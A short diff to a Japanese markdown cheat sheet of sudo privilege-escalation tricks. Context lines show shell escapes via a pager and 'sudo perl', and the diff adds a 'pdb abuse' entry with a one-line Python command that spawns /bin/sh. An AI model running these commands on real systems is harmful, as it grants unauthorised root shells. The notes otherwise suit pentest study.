@@ -12,6 +12,8 @@ sudo systemctl status <サービス>
 - (press RETURN)!sh
 # perlの悪用
 sudo perl -e 'exec "/bin/sh";'
+# pdbの悪用
+import os;os.system('/bin/sh')
 ```
 
 # tmuxとは
